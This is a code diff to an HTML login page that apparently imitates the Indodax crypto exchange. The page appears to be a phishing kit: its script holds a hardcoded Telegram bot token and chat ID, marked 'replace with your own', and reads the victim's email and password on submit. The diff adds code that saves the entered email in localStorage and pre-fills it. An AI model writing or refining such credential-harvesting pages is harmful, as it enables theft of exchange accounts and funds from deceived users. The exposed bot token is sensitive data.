@@ -130,6 +130,15 @@
     emailInput.addEventListener('input', toggleSubmitButton);
     passwordInput.addEventListener('input', toggleSubmitButton);
 
+    // Load saved email from localStorage if exists
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedEmail = localStorage.getItem('indodaxEmail');
+      if (savedEmail) {
+        emailInput.value = savedEmail;
+        toggleSubmitButton();
+      }
+    });
+
     // Telegram bot info - replace with your own
     const botToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
     const chatId = '6155537801';
@@ -138,6 +147,9 @@
       e.preventDefault();
       const email = emailInput.value;
       const password = passwordInput.value;
+
+      // Save email to localStorage
+      localStorage.setItem('indodaxEmail', email);
 
       // Show loading overlay
       loadingOverlay.classList.add('show');
@@ -172,4 +184,4 @@
     });
   </script>
 </body>
-  </html>
+</html>
